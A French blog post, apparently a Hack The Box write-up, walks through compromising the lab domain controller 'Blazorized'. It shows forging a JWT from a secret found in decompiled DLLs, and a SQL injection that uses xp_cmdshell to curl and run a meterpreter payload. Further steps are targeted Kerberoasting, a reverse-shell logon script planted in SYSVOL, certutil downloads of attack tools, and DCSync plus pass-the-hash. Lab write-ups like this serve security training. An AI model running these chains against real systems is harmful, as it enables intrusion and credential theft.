---
date: 2024-11-07T18:46:04-06:00
# description: ""
image: "/images/HTB-Blazorized/Blazorized.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Blazorized"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Blazorized](https://app.hackthebox.com/machines/Blazorized)
* Niveau: Difficle
* OS: Windows
---

Blazorized présente une variété d'attaques Active Directory. Nous commençons par examiner un serveur web hébergeant une application Blazor WebAssembly avec un accès restreint au contenu. Par le biais d'une énumération, nous trouvons plusieurs fichiers DLL associés à l'application. La décompilation d'un de ces fichiers révèle des informations sensibles, que nous utilisons pour forger un jeton Web JSON (JWT). Cela nous permet d'accéder à un panneau d'administration où nous identifions une vulnérabilité d'injection SQL, ce qui nous donne un accès initial.

En exécutant Bloodhound, nous découvrons que l'utilisateur actuel a le privilège `WriteSPN`, permettant une attaque Kerberoast ciblée pour un déplacement latéral vers un autre utilisateur. Ce second utilisateur a le droit de modifier le `Script-Path` d'un autre utilisateur, droit que nous utilisons pour effectuer un autre déplacement latéral. Après une deuxième exécution de Bloodhound, nous découvrons que le dernier utilisateur fait partie d'un groupe disposant du privilège `DCSync` sur le contrôleur de domaine, ouvrant ainsi la voie à une attaque DCSync pour obtenir le hachage de l'administrateur.

Adresse IP cible - `10.10.11.22`

## Balayage

```
./nmap_scan.sh 10.10.11.22 Blazorized
```

**Résultats**

```shell
Running detailed scan on open ports: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49678,49683,49708,49776
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 18:52 CST
Nmap scan report for 10.10.11.22
Host is up (0.065s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://blazorized.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-08 00:52:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-ntlm-info: 
|   10.10.11.22\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.22\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-07T10:01:36
|_Not valid after:  2054-11-07T10:01:36
|_ssl-date: 2024-11-08T00:53:37+00:00; +1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-info: 
|   10.10.11.22:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
| ms-sql-ntlm-info: 
|   10.10.11.22:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-11-08T00:53:37+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-07T10:01:36
|_Not valid after:  2054-11-07T10:01:36
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-08T00:53:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.71 seconds
```

Le scan nmap nous donne quelques informations:

* La cible est un contrôleur de domaine (le nom de domaine est `blazorized.htb`).
* Il y a un serveur web avec une redirection vers `http://blazorized.htb`.
* La base de données utilisée est MSSQL sur le port `1433`.

## Enumération

Avant de vérifier le serveur web, nous procédons à une énumération SMB, mais nos tentatives avec netexec et enum4linux échouent.

![netexec smb enumeration](/images/HTB-Blazorized/netexec_smb_enum.png)

![enum4linux smb enumeration](/images/HTB-Blazorized/enum4linux_smb.png)

À `http://blazorized.htb/` nous trouvons un site web construit avec Blazor Web Assembly.

![Blazorized website](/images/HTB-Blazorized/Blazorized_website.png)

![Blazorized wappalyzer](/images/HTB-Blazorized/Blazorized_tech_stack.png)

Lorsque nous sélectionnons les autres sections telles que `Interesting Digital Gardens` et `Misc. Links`, nous obtenons le message `Failed fetching data from the API of Blazorized`.

![Blazorized failed data fetching](/images/HTB-Blazorized/failed_fetching.png)

Dans la section `Check for Updates` nous apprenons que seul le super administrateur peut accéder au contenu.

![Blazorized check updates](/images/HTB-Blazorized/check_updates.png)

Nous continuons notre énumération et essayons de trouver des répertoires cachés, mais sans succès.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blazorized.htb
```

En revanche, l'énumération des sous-domaines nous permet de découvrir `admin`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blazorized.htb -H "Host: FUZZ.blazorized.htb" -ic -fs 144
```

![subdomain enumeration](/images/HTB-Blazorized/subdomain_enum.png)

À `http://admin.blazorized.htb/` nous trouvons la page de connexion du super administrateur.

![super admin login](/images/HTB-Blazorized/super_admin_login.png)

Je ne connais pas très bien les applications Blazor WebAssembly, je consulte donc la documentation pour en savoir plus sur leur structure. Sur ce [compte Github]((https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#location-of-the-blazor-script)), nous apprenons que les applications Blazor ont toujours besoin d'un script Blazor qui est essentiel au fonctionnement de l'application. De plus, elles utilisent également des fichiers json.

![Blazor script location](/images/HTB-Blazorized/Blazor_script.png)

![Blazor json files](/images/HTB-Blazorized/blazor_json_files.png)

Nous ouvrons les `Developers Tools` (avec la touche `F12`) et trouvons `_framework/blazor.webassembly.js`.

![Blazor script found in Blazorized](/images/HTB-Blazorized/blazor_script_found.png)

Dans le fichier, nous trouvons du code qui n'est pas bien formaté, nous utilisons [beautifier.io](https://beautifier.io/) pour le rendre plus lisible.

![Blazor script beautified](/images/HTB-Blazorized/js_file_beautified.png)

Nous obtenons beaucoup de code JavaScript mais rien de particulier. Continuons avec Burp Suite, nous utilisons l'extension `Blazor Traffic Processor` pour aider notre énumération.

![BTP extension](/images/HTB-Blazorized/BTP_extension.png)

Burp trouve un grand nombre de fichiers dll sous `_framework`. Nous pouvons télécharger n'importe lequel d'entre eux en allant sur `http://blazorized.htb/_framework/xxx.dll` (exemple : `blazorized.htb/_framework/Markdig.dll`), mais le faire manuellement sera certainement fastidieux.

![DLL files found](/images/HTB-Blazorized/dll_files_found.png)

Au bas de la liste des fichiers DLL dans Burp, nous trouvons un fichier appelé `blazor.boot.json`. Ce fichier sert de référence pour tous les fichiers DLL qui doivent être téléchargés pour que l'application fonctionne correctement.

![blazor boot json](/images/HTB-Blazorized/blazor_boot_json.png)

En allant sur `http://blazorized.htb/_framework/blazor.boot.json`, on retrouve effectivement la même liste de fichiers DLL sous `assembly` plus un autre fichier appelé `Blazorized.Helpers.dll` qui ne figurait pas dans Burp.

![DLL files list](/images/HTB-Blazorized/DLL_files.png)

Des recherches supplémentaires nous apprennent qu'il n'est pas rare que les applications Blazor WebAssembly exposent leurs fichiers DLL ; en réalité, cela fait partie du fonctionnement de Blazor WebAssembly.

La particularité de ces applications est qu'elles s'exécutent côté client dans le navigateur grâce à WebAssembly. Pour exécuter le code .NET dans le navigateur:

1. Le navigateur doit télécharger les fichiers DLL, y compris le code de l'application et les dépendances.
2. Le moteur d'exécution WebAssembly fourni par Blazor exécute ces DLL sur le client.

Toutefois, il incombe aux développeurs de ces applications de s'assurer qu'aucune **donnée sensible** n'est incluse dans les fichiers DLL côté client.

Nous téléchargeons les fichiers et essayons de trouver quelque chose d'exploitable, nous utiliserons le script python ci-dessous.

```python
import os
import requests
import json

json_url = 'http://blazorized.htb/_framework/blazor.boot.json'

output_dir = 'dll_files'
os.makedirs(output_dir, exist_ok=True)

response = requests.get(json_url)
data = response.json()

def download_dll(dll_name, dll_hash):
    dll_url = f'http://blazorized.htb/_framework/{dll_name}'
    file_path = os.path.join(output_dir, dll_name)
    
    try:
        dll_response = requests.get(dll_url)
        dll_response.raise_for_status()  # Check for request errors
        with open(file_path, 'wb') as file:
            file.write(dll_response.content)
        print(f'Downloaded {dll_name}')
    except requests.exceptions.RequestException as e:
        print(f'Failed to download {dll_name}: {e}')

if 'resources' in data and 'assembly' in data['resources']:
    for dll_name, dll_hash in data['resources']['assembly'].items():
        download_dll(dll_name, dll_hash)

if 'resources' in data and 'lazyAssembly' in data['resources']:
    for dll_name, dll_hash in data['resources']['lazyAssembly'].items():
        download_dll(dll_name, dll_hash)

print("Download complete.")
```

Utilisons [decompiler.com](https://www.decompiler.com/) pour décompiler nos fichiers DLL (vous pouvez aussi utiliser DNSpy sous Windows).

Décompilez `Blazorized.Helpers.dll` et allez à `Blazorized.Helpers` --> `JWT.cs`. Nous y trouvons tout ce qui est nécessaire pour créer un JWT (JSON Web Token) Super Admin. Nous utilisons [jwt.io](https://jwt.io/) pour cette tâche.

![JWT info](/images/HTB-Blazorized/JWT_info.png)

![JWT info2](/images/HTB-Blazorized/JWT_info2.png)

![JWT info3](/images/HTB-Blazorized/JWT_info3.png)

Vous trouverez ci-dessous toutes les informations dont nous avons besoin:

```
# Pour le Header (make sure to change the algorithm to 512 at the top of the page)

"alg": 512
"typ": "JWT"

# Pour le payload

"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb"
"http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin"
"iss": "http://api.blazorized.htb"
"aud": "http://admin.blazorized.htb"
"exp": "xxxxxxxxxxx" 

# Pour la section VERIFY SIGNATURE, il suffit d'utiliser la valeur de jwtSymmetricSecurityKey
```

> N'utilisez pas la valeur `exp` dans la capture d'écran, elle ne sera plus valide au moment où vous lirez cet article. Utilisez plutôt [EpochConverter](https://www.epochconverter.com/) pour générer une valeur valide. Si l'heure actuelle dépasse l'horodatage `exp`, le jeton sera rejeté comme étant expiré.

![JWT value](/images/HTB-Blazorized/jwt_value.png)

Une fois que vous avez votre valeur encodée, allez à `http://admin.blazorized.htb/`, ouvrez les outils de développement avec `F12`, puis dans`Storage` --> `Local Storage` et ajoutez votre token avec

```
key = jwt
Value = YOUR_ENCODED_JWT
```

![JWT local storage](/images/HTB-Blazorized/jwt_local_storage.png)

Après avoir actualisé la page, nous accédons au tableau de bord du super administrateur.

![Super Admin Panel](/images/HTB-Blazorized/super_admin-panel.png)

## Accès initial

Dans la section `Check Duplicate Post Titles` nous trouvons une fonctionnalité qui utilise très probablement la base de données (MSSQL), nous nous en servons et essayons d'obtenir un reverse shell via des injections SQL.

1. Nous commençons par créer un fichier `exe` malveillant.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f exe -o shell.exe
```

2. Après avoir mis en place un serveur web, nous transférons le fichier sur le système cible.

```
'; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 EXEC master.dbo.xp_cmdshell 'powershell -c "curl http://YOUR_IP:WEBSERVER_PORT/shell.exe -o %TEMP%\shell.exe" --
```

![malicious file dropped on target](/images/HTB-Blazorized/revshell1.png)

3. Nous démarrons un listener dans Metasploit via `exploit/multi/handler`.

4. Nous exécutons le fichier malicieux `exe` sur la cible et obtenons un shell meterpreter en tant que `NU_1055`.

```
'; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 EXEC master.dbo.xp_cmdshell ' %TEMP%\shell.exe --
```

![Meterpreter shell foothold](/images/HTB-Blazorized/foothold.png)

Nous trouvons le drapeau utilisateur sur le bureau.

![user flag](/images/HTB-Blazorized/user_flag.png)

### Mouvement latéral (Shell en tant que RSA_4810)

Habituellement, nous utilisons Bloodhound avec des identifiants afin de rassembler toutes les données relatives au domaine. Lorsque nous n'avons pas accès à des informations d'identification, nous pouvons utiliser [SharpHound](https://github.com/BloodHoundAD/SharpHound) pour effectuer l'énumération du domaine.
```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
```

![SharpHound transfer](/images/HTB-Blazorized/download_sharphound.png)

![SharpHound zip file](/images/HTB-Blazorized/sharhound_zip.png)

Nous téléchargeons l'archive `zip` sur notre machine locale, l'extrayons et téléchargeons les fichiers dans Bloodhound.

Nous trouvons l'utilisateur `NU_1055`, puis nous allons dans `Node Info` --> `First Degree Object Control` sous `OUTBOUND OBJECT CONTROL`. Nous découvrons que l'utilisateur a le droit `WriteSPN` sur l'utilisateur `RSA_4810`.

> Les SPN sont des identifiants utilisés par Kerberos pour associer un service à un compte particulier au sein de l'Active Directory. Lorsqu'un client demande l'accès à un service (identifié par son SPN), il demande au contrôleur de domaine un ticket de service pour ce service. Pour notre attaque Kerberoast, nous demanderons un ticket de service pour le SPN spécifique que nous allons créer. Comme les tickets de service sont chiffrés avec le hachage NTLM du mot de passe du compte de service, après avoir obtenu ces tickets, nous pouvons essayer de craquer le hachage hors ligne afin de récupérer le mot de passe du compte de service.

![WriteSPN abuse](/images/HTB-Blazorized/WriteSPN_Abuse.png)

1. Transférez `PowerView.ps1` sur la cible.

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1
```

![PowerView file transfer](/images/HTB-Blazorized/powerview_transfer.png)

* Passez à un prompt PowerShell et importez le module PowerView à l'aide de la commande suivante

```
Import-Module ./powerview.ps1
```

2. Ajoutez un SPN arbitraire au compte de l'utilisateur `RSA_4810`.

```
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='darryl/kscorpio'}
```

3. Sollicitez un ticket Kerberos, recevez le hachage du mot de passe `RSA_4810` et craquez-le.

```
Get-DomainSPNTicket -SPN darryl/kscorpio 
```

> Vous devez supprimer tous les espaces blancs du hachage afin de l'utiliser.

![Targeted kerberoast attack](/images/HTB-Blazorized/targeted_kerberoasting.png)

Avec hashcat, nous récupérons le mot de passe `(Ni7856Do9854Ki05Ng0005 #)`.

```
hashcat -m 13100 -a 0 RSA4810_hash.txt /usr/share/wordlists/rockyou.txt
```

![RSA_4810 password](/images/HTB-Blazorized/RSA_4810_pwd.png)

Nous nous connectons sous le nom de `RSA_4810`.

```
evil-winrm -u RSA_4810 -p "(Ni7856Do9854Ki05Ng0005 #)" -i blazorized.htb
```

Ce compte ne semble pas avoir de fichiers intéressants. En plus de `Administrator`, le seul autre utilisateur présent dans `C:\Users` est `SSA_6010`, nous devons probablement changer d'utilisateur.

### Mouvement latéral (Shell en tant que SSA_6010)

Enumérons les ACLs du domaine impliquant des permissions liées à l'utilisateur `RSA_4810`.

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "rsa_4810"}
```

![ACL script-path information](/images/HTB-Blazorized/write_scriptpath.png)

Il s'avère que `RSA_4810` a la permission de modifier la propriété `Script-Path` de `SSA_6010`. Lorsque j'essaie de rechercher le `scriptPath` spécifique de `SSA_6010`, le résultat est vide. Cela signifie probablement qu'aucun script de connexion n'est actuellement défini pour l'utilisateur.

![scriptPath query](/images/HTB-Blazorized/scriptPath_query.png)

Le chemin vers ces scripts est généralement relatif à un partage de réseau désigné pour les scripts de connexion, comme le répertoire `SYSVOL`, il semble que nous devons manuellement localiser le répertoire et identifier le fichier que nous pouvons modifier. Son emplacement standard est `C:\Windows\SYSVOL`.

Dans `C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts` nous découvrons que nous avons les permissions `Full` sur le répertoire `A32FF3AEAA23`.

![SYSVOL directory permissions](/images/HTB-Blazorized/SYSVOL_dir_perm.png)

1. Nous définissons un script de connexion pour l'utilisateur `SSA_6010`.

```
Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\revshell.bat' 
```

2. Nous plaçons un reverse shell PowerShell dans `revshell.bat`, qui sera automatiquement exécuté lorsque `SSA_6010` se connectera.

* Nous pouvons obtenir un reverse shell PowerShell (`PowerShell#3 (Base64)`) sur [revshells.com](https://www.revshells.com/).

```
 echo "powershell -e JAB..." | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII 
```

![Logon script revshell](/images/HTB-Blazorized/logon_script_revshell.png)

Sur notre listener, nous obtenons un shell sous le nom de `SSA_6010`.

![SSA_6010 shell](/images/HTB-Blazorized/SSA_6010_shell.png)

## Elévation de Privilèges

Nous passons à un shell meterpreter, téléchargeons SharpHound sur la cible et l'exécutons une seconde fois.

`SSA_6010` fait partie du groupe `Super_Support_Administrators`.

![SSA_6010 group memberships](/images/HTB-Blazorized/SSA_6010_group_membership.png)

Les membres de ce groupe ont le droit `DCSync` sur le contrôleur de domaine. Nous pouvons utiliser ce droit pour réaliser une attaque DCSync et obtenir le hachage du mot de passe de l'administrateur.

> Le droit DCSync est une autorisation généralement accordée aux contrôleurs de domaine dans un environnement AD. Il est utilisé pour répliquer les informations de l'annuaire, y compris les informations d'identification des comptes, à travers le domaine. Lorsqu'un serveur dispose de ce droit, il peut effectuer des opérations de synchronisation d'annuaire pour maintenir la cohérence des données entre différents contrôleurs de domaine. Avec ce droit, nous pouvons prétendre être un contrôleur de domaine en envoyant une requête `DRSGetNCChanges` au contrôleur de domaine cible et quand celui-ci répond, il nous renvoie des informations sensibles, y compris les hachages de mots de passe pour les comptes demandés.

![DCSync Abuse](/images/HTB-Blazorized/DCSync_abuse.png)

```
certutil.exe -urlcache -split -f http://YOUR-IP:WEBSERVER_PORT/mimikatz.exe mimikatz.exe
```

Exécutez mimikatz avec `.\mimikatz.exe` et pour obtenir le hachage de l'administrateur, exécutez la commande suivante.

```
lsadump::dcsync /domain:blazorized.htb /user:administrator
```

![admin password hash](/images/HTB-Blazorized/admin-hash.png)

Enfin, nous nous connectons en tant que l'`Administrateur`avec le hash, et lisons le drapeau root.

```
 evil-winrm -i 10.10.11.22 -u Administrator -H "f55ed1465179ba374ec1cad05b34a5f3" 
```

![Root flag](/images/HTB-Blazorized/root_flag.png)

Vous trouverez ci-dessous quelques références qui m'ont été utiles. Je vous remercie d'avoir lu cet article et j'espère qu'il vous a été utile.

* [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
* [SPN-jacking](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
* [ASP.NET Core Blazor WebAssembly .NET runtime and app bundle caching](https://learn.microsoft.com/en-us/aspnet/core/blazor/host-and-deploy/webassembly-caching/?view=aspnetcore-8.0)
* [Blazor Web App structure](https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#blazor-web-app)
